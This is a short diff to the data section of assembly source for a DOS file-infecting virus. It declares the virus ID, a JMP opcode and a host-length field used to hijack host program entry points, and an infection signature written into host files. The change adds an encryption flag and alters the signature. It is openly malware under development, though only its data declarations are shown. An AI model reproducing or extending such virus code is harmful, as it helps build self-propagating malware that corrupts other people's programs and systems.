@@ -2,6 +2,7 @@
 ; Data Area
 ;----------------------------------------------------------------------------
 nISRNumber EQU 08h
+doEncrypt EQU 01h
 nVirusID EQU 4B12h ;has to be 4Bxxh where the range are xx=03 to FF
 Sstart db "Start the virus code ",0
 sFileOpen db "Opening File for Read/Write...",0
@@ -36,7 +37,7 @@ wHostAttributes dw ? ;here save the file Attributes
 ;------------------------- DON'T SEPERATE -------------------------
 HostBytesNew db 0E9h ;opcode for a JMP instruction --> Jump near, relative, displacement relative to next instruction.
 wHostFileLength db 00,00 ;length of the host file (minus 3)
-VirusSignature db "?'",0 ;signature of the virus need to be 6F73 in bytes 4 and 5 in host file .
+VirusSignature db "ss",0 ;signature of the virus need to be 6F73 in bytes 4 and 5 in host file .
 ;------------------------- DON'T SEPERATE -------------------------
 HostBytesOld db 3 dup(?);first three bytes of host file.
 HostSignature db 2 dup (?),0 ;the virus signature is stored in bytes
